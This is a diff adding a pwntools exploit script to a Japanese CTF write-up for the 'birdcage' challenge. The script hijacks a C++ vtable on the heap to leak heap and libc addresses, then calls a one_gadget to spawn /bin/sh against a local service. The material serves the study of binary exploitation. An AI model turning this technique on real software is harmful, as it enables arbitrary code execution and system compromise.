@@ -243,6 +243,70 @@ birdcage の脆弱性で直接書き換えることができるのはヒープ�
 偽の vtable のアドレスのためにヒープのアドレスが必要になるので、cage[0] から読み出す。
 
 
+### 攻略スクリプト
+```python
+from pwn import *
+
+
+elf = ELF('birdcage')
+context.binary = elf
+
+
+s = remote('localhost', 10005)
+
+
+# オウムを２匹捕まえて、鳴き声は適当に指定
+s.sendlineafter('> ', 'capture 0 parrot')
+s.sendlineafter(': ', 'hoge')
+s.sendlineafter('> ', 'capture 1 parrot')
+s.sendlineafter(': ', 'fuga')
+
+
+
+# addrの値を読み出す
+def read(addr):
+    # parrot 0の仮想関数テーブルからparrot 1の仮想関数テーブルを書き換える
+    s.sendlineafter('> ', 'release 0')
+    s.sendlineafter('> ', 'capture 0 parrot')
+    s.sendlineafter(': ',
+        b'a'*0x10 +
+        pack(0x31) +
+        pack(0x604d08) + # vtable for Parrot+0x10
+        pack(addr))
+    
+    # 書き換えた parrot 1 の
+    s.sendlineafter('> ', 'sing 1')
+
+    #改行が来るまでのデータを受け取り、末尾1文字を取り除いて返す
+    v = s.recvline()[:-1]
+    return unpack(v.ljust(8, b'\0'))
+
+
+
+# PwntoolsはELFファイル内の利用できるシンボルの情報を辞書型で保持している。(形式は、{name: data})
+heap = read(elf.symbols.cage) - 0x10
+print('heap:', hex(heap))
+
+# ELF.got で GOTエントリの情報を参照。それをもとに、libcのベース(先頭)アドレスを取得。
+start = read(elf.got.__libc_start_main)
+libc = ELF('libc-2.27.so')
+libc_base = start - libc.symbols.__libc_start_main
+print('libc_base:', hex(libc_base))
+
+# one_gadgetより: 0x4f322 execve("/bin/sh", rsp+0x40, environ)
+rce = libc_base + 0x4f322
+s.sendlineafter('> ', 'release 0')
+s.sendlineafter('> ', 'capture 0 parrot')
+s.sendlineafter(': ',
+    b'a'*0x10 +
+    pack(0x31) +
+    pack(heap+0x48) +
+    pack(rce)) # heap+0x48
+s.sendlineafter('> ', 'sing 1')
+
+s.interactive()
+```
+
 ## 参考
 - 江添亮のC++入門 https://ezoeryou.github.io/cpp-intro/#class%E3%81%A8%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E6%8C%87%E5%AE%9A
 - Malleus CTF Pwn 2nd Edition
